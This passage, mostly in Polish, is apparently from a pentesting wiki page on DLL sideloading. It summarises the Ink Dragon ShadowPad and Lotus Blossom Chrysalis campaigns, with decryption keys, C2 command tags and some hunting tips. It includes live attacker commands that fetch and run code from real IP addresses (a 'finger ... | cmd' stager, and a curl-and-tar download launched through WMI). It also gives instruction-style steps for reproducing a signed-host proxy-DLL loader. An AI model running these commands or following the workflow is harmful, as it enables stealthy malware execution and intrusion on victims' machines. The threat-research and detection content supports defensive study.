Check Point opisał, jak Ink Dragon wdraża ShadowPad używając **trzyplikowego triad** do wtopienia się w legalne oprogramowanie, jednocześnie trzymając core payload zaszyfrowany na dysku:

1. **Signed host EXE** – nadużywane są vendorzy tacy jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę executable, aby wyglądał jak Windows binary (na przykład `conhost.exe`), ale podpis Authenticode pozostaje poprawny.
2. **Malicious loader DLL** – umieszczany obok EXE z oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zwykle MFC binary zaciemniony przez framework ScatterBrain; jego jedynym zadaniem jest znaleźć zaszyfrowany blob, odszyfrować go i refleksyjnie zmapować ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po memory-mapping odszyfrowanego payloadu loader usuwa plik TMP, aby zniszczyć dowody forensic.

Tradecraft notes:

* Zmiana nazwy signed EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod Windows binary, a jednocześnie zachować podpis vendor, więc odtwarzaj zwyczaj Ink Dragon polegający na wrzucaniu binary wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ executable pozostaje zaufany, większość kontroli allowlisting musi tylko dopilnować, aby złośliwy DLL leżał obok niego. Skup się na dostosowaniu loader DLL; signed parent zwykle może działać bez zmian.
* Decryptor ShadowPad oczekuje, że blob TMP będzie obok loadera i będzie writable, aby mógł wyzerować plik po zmapowaniu. Zostaw katalog writable do czasu załadowania payloadu; po wczytaniu do pamięci plik TMP można bezpiecznie usunąć dla OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, tak aby jedynym custom artifact na dysku był złośliwy DLL obok zaufanego EXE:

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera komendy z Finger server i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst TCP/79; `| cmd` wykonuje odpowiedź serwera, co pozwala operatorom rotować second stage po stronie serwera.

- **Built-in download/extract:** Pobierz archive z benign extension, rozpakuj go i przygotuj target sideload oraz DLL w losowym folderze `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetry pokazywała process utworzony przez CIM, podczas gdy ładuje on lokalny DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binary, które preferują local DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Alarmuj na `forfiles`, gdy `/p`, `/m` i `/c` występują razem; rzadkie poza skryptami admin.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawna intrusion Lotus Blossom nadużyła zaufanego update chain, aby dostarczyć NSIS-packed dropper, który przygotował DLL sideload plus fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, wrzuca przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` mmap-loaduje blob; `LogWrite` odszyfrowuje go za pomocą custom stream opartego o LCG (stałe **0x19660D** / **0x3C6EF35F**, key material wyprowadzone z wcześniejszego hash), nadpisuje bufor plaintext shellcode, zwalnia tempy i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API przez hashowanie export names przy użyciu **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, a następnie stosuje Murmur-style avalanche (**0x85EBCA6B**) i porównuje do salted target hashes.

Main shellcode (Chrysalis)
- Odszyfrowuje PE-like main module przez powtarzanie add/XOR/sub z kluczem `gQ2JR&9;` przez pięć przejść, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć import resolution.
- Odtwarza nazwy DLL w runtime przez per-character bit-rotate/XOR transforms, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi po **PEB → InMemoryOrderModuleList**, parsuje każdą export table w blokach 4-bajtowych z Murmur-style mixing i tylko wtedy wraca do `GetProcAddress`, gdy hash nie zostanie znaleziony.

Embedded configuration & C2
- Config znajduje się wewnątrz wrzuconego pliku `BluetoothService` pod **offset 0x30808** (size **0x980**) i jest odszyfrowywany przez RC4 z kluczem `qwhvb^435h&*7`, ujawniając C2 URL oraz User-Agent.
- Beacony budują host profile rozdzielany kropkami, dodają tag `4Q`, a następnie szyfrują RC4 kluczem `vAuig34%^325hGV` przed `HttpSendRequestA` over HTTPS. Odpowiedzi są odszyfrowywane RC4 i dispatchowane przez tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Tryb execution jest sterowany przez CLI args: bez args = install persistence (service/Run key) wskazujące na `-i`; `-i` uruchamia ponownie siebie z `-k`; `-k` pomija install i uruchamia payload.

Alternate loader observed
- Ta sama intrusion wrzuciła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczony przez atakującego C source zawierał embedded shellcode, kompilował się i działał in-memory bez dotykania dysku plikiem PE. Odtwórz z:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap compile-and-run oparty na TCC zaimportował `Wininet.dll` w czasie działania i pobrał shellcode drugiego etapu z hardcoded URL, dając elastyczny loader, który podszywał się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
